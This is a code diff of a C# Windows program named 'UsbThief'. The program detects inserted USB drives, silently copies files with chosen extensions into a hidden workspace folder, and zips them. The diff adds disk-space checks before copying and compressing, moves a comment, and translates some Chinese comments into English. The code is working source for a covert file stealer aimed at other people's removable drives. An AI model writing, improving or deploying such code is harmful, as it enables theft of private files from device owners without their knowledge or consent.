@@ -20,17 +20,16 @@ namespace UsbThief
     public partial class Form1 : Form
     {
         #region 声明变量
-        public const int innerVer = 1;
+        public const int innerVer = 2;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
-        public bool noSpace = false;
         public bool fc2c = false;
         public bool inDelay = false;
-        public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
-        public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
-        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
-        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
-        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
-        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
+        public const int WM_DEVICECHANGE = 0x219;//Notifies an application of a change to the hardware configuration of a device or the computer.
+        public const int DBT_DEVICEARRIVAL = 0x8000;  //A device or piece of media has been inserted and is now available.
+        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //Permission is requested to remove a device or piece of media. Any application can deny this request and cancel the removal.
+        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //A request to remove a device or piece of media has been canceled.
+        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //A device or piece of media has been removed.
+        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //A device or piece of media is about to be removed. Cannot be denied.
         public LogForm form = new LogForm();
         public static Logger logger = null;
         public SynchronizationContext mainThreadSynContext;
@@ -99,19 +98,6 @@ namespace UsbThief
                 logger.Error("无法创建工作区目录：\n" + e);
             }
             HideFiles(workspace);
-            long freeSpace = 0;
-            string str = Application.StartupPath.Substring(0, 3);
-            DriveInfo[] drives = DriveInfo.GetDrives();
-            foreach (var drive in drives)
-            {
-                if (drive.Name == str)
-                {
-                    freeSpace = drive.TotalFreeSpace / (1024 * 1024);
-                    break;
-                }
-            }
-            if (freeSpace <= 200)
-                noSpace = true;
             Thread t = new Thread(() =>
             {
                 try
@@ -234,15 +220,17 @@ namespace UsbThief
         {
             try
             {
-                if (m.Msg == WM_DEVICECHANGE && conf.enable)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
+                if (m.Msg == WM_DEVICECHANGE && conf.enable)
                 {
                     int wp = m.WParam.ToInt32();
                     if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                     {
                         if (wp == DBT_DEVICEARRIVAL)
                         {
-                            if (noSpace || inDelay)
+                            if (inDelay)
                             {
+                                //不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
+                                logger.Info("当前处于延迟期间，将不会处理新设备");
                                 return;
                             }
                             Thread copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
@@ -584,6 +572,47 @@ namespace UsbThief
             }
         }
         #endregion
+        #region 获取剩余磁盘空间与计算文件夹大小
+        private long GetFreeSpace()
+        {
+            long freeSpace = 0;
+            string str = Application.StartupPath.Substring(0, 3);
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            foreach (var drive in drives)
+            {
+                if (drive.Name == str)
+                {
+                    freeSpace = drive.TotalFreeSpace;
+                    break;
+                }
+            }
+            return freeSpace;
+        }
+        private long GetDirectoryLength(string dirPath)
+        {
+            //判断给定的路径是否存在,如果不存在则退出
+            if (!Directory.Exists(dirPath))
+                return 0;
+            long len = 0;
+            //定义一个DirectoryInfo对象
+            DirectoryInfo di = new DirectoryInfo(dirPath);
+            //通过GetFiles方法,获取di目录中的所有文件的大小
+            foreach (FileInfo fi in di.GetFiles())
+            {
+                len += fi.Length;
+            }
+            //获取di中所有的文件夹,并存到一个新的对象数组中,以进行递归
+            DirectoryInfo[] dis = di.GetDirectories();
+            if (dis.Length > 0)
+            {
+                for (int i = 0; i < dis.Length; i++)
+                {
+                    len += GetDirectoryLength(dis[i].FullName);
+                }
+            }
+            return len;
+        }
+        #endregion
         #region 检测扩展名
         private bool CheckExt(string ext)
         {
@@ -629,6 +658,11 @@ namespace UsbThief
                         FileInfo fi1 = new FileInfo(fsi.FullName);
                         if (CheckExt(fi1.Extension))
                         {
+                            if (fi1.Length > GetFreeSpace())
+                            {
+                                logger.Info("剩余磁盘空间不足，将不会复制此文件");
+                                continue;
+                            }
                             if (File.Exists(targetFileName))
                             {
                                 FileInfo fi2 = new FileInfo(targetFileName);
@@ -641,7 +675,7 @@ namespace UsbThief
                             }
                             else
                             {
-                                if (fi1.Length < conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
+                                if (fi1.Length <= conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
                                 {
                                     fc2c = true;
                                     logger.Info("正在复制文件：" + fsi.FullName);
@@ -687,6 +721,11 @@ namespace UsbThief
                 string dest = path + ".zip";
                 if (File.Exists(dest))
                     File.Delete(dest);
+                if (GetDirectoryLength(path) > GetFreeSpace())
+                {
+                    logger.Info("剩余磁盘空间不足，将不会压缩");
+                    return;
+                }
                 logger.Info("正在压缩：" + path);
                 using (ZipFile zip = new ZipFile(dest, Encoding.UTF8))
                 {
